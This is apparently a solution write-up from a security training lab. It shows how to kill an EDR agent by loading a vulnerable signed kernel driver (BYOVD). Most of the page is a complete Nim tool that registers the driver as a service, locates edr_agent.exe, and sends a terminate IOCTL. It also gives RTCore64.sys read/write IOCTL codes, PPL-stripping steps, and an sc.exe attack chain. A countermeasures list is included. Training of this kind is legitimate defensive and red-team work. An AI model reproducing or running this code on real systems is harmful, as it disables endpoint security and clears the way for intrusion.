---
title: "Solution 37: BYOVD — Kill the EDR Agent"
difficulty: hard
category: "BYOVD / Kernel Attacks"
---

[Back to Challenge]({{ '/challenges/37-byovd-kill-edr/' | relative_url }})

## Overview

BYOVD (Bring Your Own Vulnerable Driver) exploits a legitimately signed kernel driver that exposes a process-termination IOCTL. From kernel level, `ZwTerminateProcess` kills any process — including those that survive `TerminateProcess` from user-mode (PPL, elevated, handle-protected). The MostShittyEDR agent has none of these protections, making it trivially killable.

## Solution (NimBlackout Pattern)

This follows the [NimBlackout](https://github.com/Helixo32/NimBlackout) approach: load a vulnerable driver as a service, open its device, find the target PID, send a kill IOCTL.

```nim
# byovd_kill.nim - kill EDR agent via vulnerable driver IOCTL
import winim/lean
import os, strutils

const
  DRIVER_NAME = "VulnDriver"
  DEVICE_PATH = r"\\.\VulnDriver"
  # Blackout.sys IOCTLs (from gmer driver)
  IOCTL_INIT      = 0x9876C004'u32
  IOCTL_TERMINATE = 0x9876C094'u32

proc loadDriver(driverPath: string): bool =
  let scm = OpenSCManagerA(nil, nil, SC_MANAGER_CREATE_SERVICE)
  if scm == 0: return false
  defer: CloseServiceHandle(scm)

  let fullPath = absolutePath(driverPath)
  var svc = CreateServiceA(scm, DRIVER_NAME, DRIVER_NAME,
    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    fullPath, nil, nil, nil, nil, nil)

  if svc == 0:
    if GetLastError() == ERROR_SERVICE_EXISTS:
      svc = OpenServiceA(scm, DRIVER_NAME, SERVICE_ALL_ACCESS)
    else:
      return false
  defer: CloseServiceHandle(svc)

  if StartServiceA(svc, 0, nil) == 0:
    return GetLastError() == ERROR_SERVICE_ALREADY_RUNNING
  return true

proc findProcessByName(name: string): DWORD =
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return 0
  defer: CloseHandle(snap)

  var pe: PROCESSENTRY32
  pe.dwSize = DWORD(sizeof(PROCESSENTRY32))
  if Process32First(snap, &pe) != 0:
    while true:
      let exeName = $cast[cstring](addr pe.szExeFile[0])
      if exeName.toLowerAscii() == name.toLowerAscii():
        return pe.th32ProcessID
      if Process32Next(snap, &pe) == 0: break
  return 0

proc killViaDriver(pid: DWORD): bool =
  let hDevice = CreateFileA(DEVICE_PATH, GENERIC_READ or GENERIC_WRITE,
    0, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
  if hDevice == INVALID_HANDLE_VALUE:
    echo "[-] Cannot open device: ", GetLastError()
    return false
  defer: CloseHandle(hDevice)

  # Initialize the driver
  var bytesReturned: DWORD
  if DeviceIoControl(hDevice, IOCTL_INIT,
      nil, 0, nil, 0, &bytesReturned, nil) == 0:
    echo "[-] IOCTL_INIT failed"
    return false

  # Send kill command with target PID
  var targetPid = pid
  if DeviceIoControl(hDevice, IOCTL_TERMINATE,
      &targetPid, DWORD(sizeof(DWORD)),
      nil, 0, &bytesReturned, nil) == 0:
    echo "[-] IOCTL_TERMINATE failed"
    return false

  echo "[+] Kernel-killed process PID ", pid
  return true

when isMainModule:
  if paramCount() < 1:
    echo "Usage: byovd_kill.exe <driver.sys>"
    quit(1)

  echo "[*] Loading vulnerable driver..."
  if not loadDriver(paramStr(1)):
    echo "[-] Failed to load driver (need admin)"
    quit(1)

  echo "[*] Finding edr_agent.exe..."
  let pid = findProcessByName("edr_agent.exe")
  if pid == 0:
    echo "[-] edr_agent.exe not found"
    quit(1)

  echo "[*] Target PID: ", pid
  echo "[*] Sending kernel kill IOCTL..."
  if killViaDriver(pid):
    echo "[+] EDR agent terminated from kernel level"
  else:
    echo "[-] Kill failed"
```

## Alternative: RTCore64.sys Approach

Instead of a process-kill IOCTL, use a driver with arbitrary kernel R/W to directly call `ZwTerminateProcess` from kernel context:

```nim
# Alternative using RTCore64.sys for kernel memory R/W
const
  RTCORE_DEVICE = r"\\.\RTCore64"
  RTCORE_READ   = 0x80002048'u32
  RTCORE_WRITE  = 0x8000204C'u32

type
  RtCoreReadWrite {.packed.} = object
    unknown1: uint32
    unknown2: uint32
    address: uint64
    unknown3: uint32
    value: uint32

# With R/W primitives you can:
# 1. Find the EPROCESS for edr_agent.exe
# 2. Follow ActiveProcessLinks to walk the process list
# 3. Write to the EPROCESS.Protection field to strip PPL
# 4. Or simply open a handle and call TerminateProcess
#    (after stripping protection if needed)
```

## Why It Works

1. **No self-protection**: The EDR agent doesn't monitor its own process handle or survival
2. **No PPL**: The agent runs as a standard user-mode process — no Protected Process Light
3. **No tamper detection**: The kernel driver doesn't detect if the agent dies unexpectedly
4. **One-shot kill**: Unlike user-mode `TerminateProcess`, kernel-level `ZwTerminateProcess` cannot be blocked by any user-mode defense
5. **Pre-detection**: The agent is dead before it can log the kill — process creation of the attacker tool might be logged (Rule 1), but the tool can rename itself (Challenge 01)

## Attack Chain

```
1. Get Administrator privileges (prerequisite)
2. Drop vulnerable driver (Blackout.sys, RTCore64.sys, etc.)
3. sc.exe create VulnDriver type= kernel binPath= C:\path\to\vuln.sys
4. sc.exe start VulnDriver
5. Find edr_agent.exe PID via Toolhelp32
6. Open \\.\VulnDriver device
7. Send IOCTL_TERMINATE with target PID
8. EDR is dead — operate freely
```

## Real-World Countermeasures

Production EDRs defend against BYOVD process kills with:
- **Protected Process Light (PPL)**: The EDR service runs as PPL — kernel kill requires removing PP protection first
- **Tamper protection**: Kernel-level self-defense via `ObRegisterCallbacks` on the EDR's own process
- **Driver blocklists**: HVCI Driver Blocklist (`DriverSiPolicy.p7b`) blocks known-vulnerable drivers from loading
- **Kernel code integrity**: `WHQL` enforcement prevents unsigned drivers
- **Watchdog processes**: Multiple inter-dependent processes that restart each other
- **Kernel minifilters**: Block writing `.sys` files to disk before they can be loaded

## How to Verify

1. Start the EDR: `.\edr_agent.exe --driver --verbose`
2. Note the PID shown in the agent banner
3. In an admin terminal, load the vulnerable driver and run the kill tool
4. The EDR process disappears — confirm with `tasklist /fi "imagename eq edr_agent.exe"`
5. The kernel driver remains loaded but orphaned — no agent reads its events
